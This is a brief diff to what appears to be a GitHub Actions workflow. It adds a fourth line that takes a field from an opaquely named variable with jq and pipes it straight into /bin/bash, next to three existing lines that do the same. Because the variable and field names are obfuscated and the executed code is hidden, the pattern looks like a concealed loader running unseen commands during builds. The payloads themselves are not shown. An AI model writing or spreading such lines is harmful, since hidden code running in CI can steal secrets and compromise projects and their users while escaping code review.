@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$wdx6" | jq -r .fypb647 | /bin/bash
           echo $ga91904 | jq -r .vemjx6241 | /bin/bash
           echo $d92460 | jq -r .oe0 | /bin/bash
+          echo $agg567 | jq -r .d17772 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
